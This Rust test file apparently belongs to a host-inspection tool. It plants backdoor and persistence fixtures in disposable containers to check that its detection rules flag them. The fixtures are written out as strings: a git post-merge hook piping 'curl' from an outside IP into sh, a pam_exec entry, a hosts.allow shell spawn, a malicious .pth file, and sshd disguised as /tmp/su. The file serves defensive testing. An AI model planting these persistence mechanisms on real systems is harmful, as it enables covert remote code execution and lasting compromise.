//! Disposable-container fixture run for the backdoor and rootkit entries.
//! Each case runs the catalog's own container command (the same text
//! `execute_in_container` sends) and decides hits with the entry's own rule.
//! Driven by `LOVELYHAWK_LAB_CONTAINERS=<family>=<container>[,...]` with
//! `LOVELYHAWK_LAB_CLI` (default `podman`); the probe owns the containers.

use super::{SystemFamily, guarded_container_command, lookup};
use crate::command_findings::finding_lines;
use std::process::Command;
use std::time::Instant;

struct Case {
    id: &'static str,
    fixture: &'static str,
    expect: &'static [&'static str],
    quiet: &'static [&'static str],
}

const CASES: &[Case] = &[
    Case {
        id: "process-exe-path",
        fixture: "ssh-keygen -A >/dev/null 2>&1; ln -sf \"$(command -v sshd)\" /tmp/su; mkdir -p /run/sshd; /tmp/su -oPort=8888; sleep 1",
        expect: &["sshd 以名称", "/tmp/su"],
        quiet: &[],
    },
    Case {
        id: "persistence-pam",
        fixture: "mkdir -p /etc/pam.d; printf 'auth optional pam_exec.so /tmp/x\\n# auth optional pam_exec.so /tmp/quiet\\n' > /etc/pam.d/lhtest",
        expect: &["pam_exec.so /tmp/x"],
        quiet: &["/tmp/quiet"],
    },
    Case {
        id: "persistence-inetd",
        fixture: "printf \"sshd: ALL : spawn (/bin/sh -c 'id') &\\n\" >> /etc/hosts.allow",
        expect: &["spawn"],
        quiet: &[],
    },
    Case {
        id: "persistence-python-pth",
        fixture: "d=/usr/lib/python3/dist-packages; mkdir -p $d; printf \"import os; os.system('id')\\n\" > $d/lhtest.pth; printf \"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \\n\" > $d/distutils-precedence.pth",
        expect: &["lhtest.pth"],
        quiet: &["distutils-precedence.pth"],
    },
    Case {
        id: "persistence-git-hooks",
        fixture: "h=/root/repo/.git/hooks; mkdir -p $h; printf '#!/bin/sh\\ncurl http://198.51.100.7/x | sh\\n' > $h/post-merge; chmod +x $h/post-merge; printf '#!/bin/sh\\n' > $h/pre-commit.sample; chmod +x $h/pre-commit.sample",
        expect: &["post-merge"],
        quiet: &["pre-commit.sample"],
    },
    Case {
        id: "system-modules",
        fixture: "",
        expect: &[],
        quiet: &["关注："],
    },
    Case {
        id: "process-hidden",
        fixture: "",
        expect: &[],
        quiet: &["关注："],
    },
];

fn cli() -> String {
    std::env::var("LOVELYHAWK_LAB_CLI").unwrap_or_else(|_| "podman".to_owned())
}

fn exec(container: &str, script: &str) -> String {
    let output = Command::new(cli())
        .args(["exec", container, "/bin/sh", "-c", script])
        .output()
        .expect("container CLI");
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn family(name: &str) -> SystemFamily {
    match name {
        "debian" => SystemFamily::Debian,
        "alpine" => SystemFamily::Alpine,
        "redhat" => SystemFamily::RedHat,
        other => panic!("unknown family {other}"),
    }
}

#[test]
#[ignore = "needs disposable containers named in LOVELYHAWK_LAB_CONTAINERS"]
fn backdoor_entries_flag_container_fixtures() {
    let containers = std::env::var("LOVELYHAWK_LAB_CONTAINERS").expect("containers");
    let mut failures = Vec::new();
    for pair in containers.split(',') {
        let (name, container) = pair.split_once('=').expect("family=container");
        for case in CASES {
            if !case.fixture.is_empty() {
                exec(container, case.fixture);
            }
            let definition = lookup(case.id).expect("catalog entry");
            let command = guarded_container_command(&definition, family(name));
            let started = Instant::now();
            let output = exec(container, &command);
            let elapsed = started.elapsed();
            let lines: Vec<&str> = output.lines().collect();
            let flagged: Vec<&str> = finding_lines(&output, definition.abnormal)
                .into_iter()
                .filter_map(|line| lines.get(line as usize).copied())
                .collect();
            println!(
                "== {name} {} {:.1}s flagged={}\n{output}",
                case.id,
                elapsed.as_secs_f64(),
                flagged.len()
            );
            for marker in case.expect {
                if !flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: no flagged line with {marker}", case.id));
                }
            }
            for marker in case.quiet {
                if flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: flagged quiet line {marker}", case.id));
                }
            }
            if elapsed.as_secs() >= definition.entry.timeout_seconds {
                failures.push(format!("{name} {}: exceeded timeout", case.id));
            }
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}
